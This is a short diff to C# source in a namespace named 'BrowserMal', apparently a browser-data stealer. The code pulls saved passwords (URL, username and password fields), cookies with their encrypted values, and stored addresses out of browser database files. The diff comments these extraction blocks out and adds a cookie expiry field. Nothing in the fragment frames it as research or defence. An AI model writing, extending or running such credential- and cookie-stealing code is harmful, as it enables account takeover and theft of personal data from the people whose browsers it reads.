@@ -14,19 +14,20 @@ namespace BrowserMal
             browserManager.Init();
             List<BrowserModel> browsers = browserManager.GetBrowsers();
 
-            GenericManager<CredentialModel> credentialManager = new GenericManager<CredentialModel>("logins", new string[] 
+            /*GenericManager<CredentialModel> credentialManager = new GenericManager<CredentialModel>("logins", new string[] 
             { 
                 "origin_url", 
                 "username_value", 
                 "password_value" 
             }, true);
-            credentialManager.Init(ref browsers, Browser.Util.LOGIN_DATA);
+            credentialManager.Init(ref browsers, Browser.Util.LOGIN_DATA);*/
 
-            GenericManager<CookieModel> cookiesManager = new GenericManager<CookieModel>("cookies", new string[] 
+            /*GenericManager<CookieModel> cookiesManager = new GenericManager<CookieModel>("cookies", new string[] 
             { 
                 "host_key", 
                 "name", 
-                "path", 
+                "path",
+                "expires_utc",
                 "encrypted_value" 
             }, true);
             cookiesManager.Init(ref browsers, Browser.Util.COOKIES);
@@ -47,7 +48,7 @@ namespace BrowserMal
                 "city",
                 "zipcode"
             }, false);
-            addressesManager.Init(ref browsers, Browser.Util.WEB_DATA);
+            addressesManager.Init(ref browsers, Browser.Util.WEB_DATA);*/
         }
     }
 }
